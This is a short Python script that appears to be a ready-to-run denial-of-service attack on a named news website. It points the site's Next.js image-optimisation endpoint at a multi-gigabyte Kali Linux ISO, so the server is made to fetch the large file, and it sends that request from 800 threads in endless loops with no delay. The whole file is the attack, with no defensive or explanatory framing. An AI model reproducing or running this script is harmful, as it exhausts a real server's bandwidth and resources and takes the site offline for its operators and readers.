import requests, json, re, threading, time

from urllib3.exceptions import InsecureRequestWarning
from urllib3 import disable_warnings
disable_warnings(InsecureRequestWarning)



url1 = "https://facethepeople.news"
url2 = "https://cdimage.kali.org/kali-2025.3/kali-linux-2025.3-installer-amd64.iso"

url = url1+"/_next/image?url="+url2+"&w=384&q=75"




session = requests.Session()
def req():
    while True:
        try:
            response = requests.get(url)
            print(response)
        except Exception as e:
            print(e)
            #time.sleep(10)





def r():
    total_threads = 800
    threads = []

    for i in range(total_threads):
        t = threading.Thread(target=req)
        threads.append(t)
        t.start()

    # Wait for all threads to finish
    for t in threads:
        t.join()

    print("All threads completed!")


r()
